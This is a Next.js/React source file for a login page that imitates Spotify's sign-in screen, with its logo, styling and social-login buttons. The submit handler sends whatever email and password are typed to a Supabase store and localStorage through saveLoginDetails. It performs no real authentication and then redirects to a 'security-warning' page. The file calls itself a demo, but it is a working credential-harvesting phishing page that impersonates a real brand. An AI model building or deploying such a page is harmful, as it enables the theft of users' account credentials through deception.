"use client"

import Image from "next/image";
import Link from "next/link";
import { useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { EyeIcon, EyeOffIcon } from "lucide-react";
import { saveLoginDetails } from "@/lib/supabase";

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError("");

    try {
      // Save login details to Supabase and localStorage
      const { error } = await saveLoginDetails(email, password);

      if (error) {
        console.error("Error saving login details:", error);
        // Continue anyway for the demo
      }

      // In a real app, you would authenticate the user
      // For the demo, we'll redirect to the security warning page
      window.location.href = "/account/security-warning";
    } catch (err) {
      console.error("Login error:", err);
      setError("An error occurred during login. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center min-h-screen w-full max-w-md mx-auto px-6 py-8">
      <div className="mb-10 mt-12">
        <img
          src="/spotify.png"
          alt="Spotify"
          width={50}
          height={50}
        />
      </div>

      <h1 className="text-4xl font-bold mb-10 text-white">
        Log in to Spotify
      </h1>

      <div className="w-full space-y-4">
        <Button
          variant="outline"
          className="w-full bg-transparent text-white border border-gray-600 hover:border-white hover:bg-black/20 rounded-full py-6 flex items-center justify-center"
        >
          <div className="flex items-center space-x-2">
            <Image src="/google-icon.svg" alt="Google" width={20} height={20} />
            <span className="flex-1 text-center">Continue with Google</span>
          </div>
        </Button>

        <Button
          variant="outline"
          className="w-full bg-transparent text-white border border-gray-600 hover:border-white hover:bg-black/20 rounded-full py-6 flex items-center justify-center"
        >
          <div className="flex items-center space-x-2">
            <Image src="/facebook-icon.svg" alt="Facebook" width={20} height={20} />
            <span className="flex-1 text-center">Continue with Facebook</span>
          </div>
        </Button>

        <Button
          variant="outline"
          className="w-full bg-transparent text-white border border-gray-600 hover:border-white hover:bg-black/20 rounded-full py-6 flex items-center justify-center"
        >
          <div className="flex items-center space-x-2">
            <Image src="/apple-icon.svg" alt="Apple" width={40} height={40} />
            <span className="flex-1 text-center">Continue with Apple</span>
          </div>
        </Button>
      </div>

      <div className="w-full my-8 border-t border-gray-700" />

      {error && (
        <div className="w-full mb-4 p-3 bg-red-900/50 border border-red-500 rounded text-white text-sm">
          {error}
        </div>
      )}

      <form onSubmit={handleSubmit} className="w-full space-y-6">
        <div className="space-y-2">
          <label htmlFor="email" className="text-sm font-medium text-white">
            Email or username
          </label>
          <Input
            id="email"
            type="text"
            placeholder="Email or username"
            className="bg-[#121212] border border-gray-600 rounded text-white h-12 placeholder:text-gray-400"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
        </div>

        <div className="space-y-2">
          <label htmlFor="password" className="text-sm font-medium text-white">
            Password
          </label>
          <div className="relative">
            <Input
              id="password"
              type={showPassword ? "text" : "password"}
              placeholder="Password"
              className="bg-[#121212] border border-gray-600 rounded text-white h-12 placeholder:text-gray-400 pr-10"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="button"
              className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400"
              onClick={togglePasswordVisibility}
            >
              {showPassword ? (
                <EyeOffIcon className="h-5 w-5" />
              ) : (
                <EyeIcon className="h-5 w-5" />
              )}
            </button>
          </div>
        </div>

        <Button
          type="submit"
          className="w-full bg-[#1ed760] hover:bg-[#1fdf64] text-black font-semibold rounded-full py-6"
          disabled={isLoading}
        >
          {isLoading ? "Logging in..." : "Log In"}
        </Button>
      </form>

      <div className="mt-6 text-center">
        <Link href="#" className="text-white hover:underline">
          Forgot your password?
        </Link>
      </div>

      <div className="mt-10 text-center">
        <p className="text-gray-400">
          Don&apos;t have an account?{" "}
          <Link href="#" className="text-white hover:underline">
            Sign up for Spotify
          </Link>
        </p>
      </div>

      <div className="mt-10 text-center text-xs text-gray-500">
        <p>
          This site is protected by reCAPTCHA and the Google{" "}
          <Link href="https://policies.google.com/privacy" target="_blank" className="underline">
            Privacy Policy
          </Link>{" "}
          and{" "}
          <Link href="https://policies.google.com/terms" target="_blank" className="underline">
            Terms of Service
          </Link>{" "}
          apply.
        </p>
      </div>
    </div>
  );
}
